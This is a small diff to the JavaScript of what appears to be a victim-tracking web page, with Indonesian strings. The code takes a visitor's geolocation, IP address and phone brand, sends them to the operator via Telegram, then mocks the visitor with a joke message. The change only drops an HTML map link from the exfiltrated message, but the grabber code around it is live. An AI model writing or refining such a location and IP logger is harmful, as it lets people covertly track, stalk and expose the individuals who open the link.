@@ -57,7 +57,7 @@ navigator.geolocation.getCurrentPosition(
     const merek = getMerekHP();
 
     // Menambahkan link peta di pesan jika lokasi diizinkan
-    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}\nPeta Lokasi: <a href="${gmaps}" target="_blank">Klik untuk melihat peta</a>`;
+    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}`;
     await kirimPesanTelegram(pesan);
 
     document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
